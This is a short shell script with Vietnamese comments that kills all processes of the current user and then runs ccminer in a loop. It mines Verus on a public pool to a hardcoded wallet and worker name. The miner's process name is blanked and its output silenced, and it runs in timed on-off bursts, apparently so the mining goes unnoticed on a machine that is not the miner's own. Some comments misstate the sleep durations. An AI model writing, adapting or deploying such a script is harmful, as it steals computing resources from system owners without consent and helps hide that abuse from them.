#!/bin/sh
pkill -u $(whoami)

sleep 500

while true; do
    # Chạy lệnh với tên tiến trình đã thay đổi
    bash -c "exec -a '' ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3960 -u RVvQgyuoCCRiQV7BBTDNNMAUH3WYp8HC9K.saverNode0003 -t 1 > /dev/null 2>&1" &
    
    # Lưu PID của tiến trình
    PID=$!  # Lưu PID ngay sau khi chạy

    # Chờ 10 phút
    sleep 200

    # Dừng tiến trình
    kill $PID

    # Đợi cho tiến trình dừng hoàn toàn
    wait $PID 2>/dev/null

    # Nghỉ 240 giây
    sleep 600
done

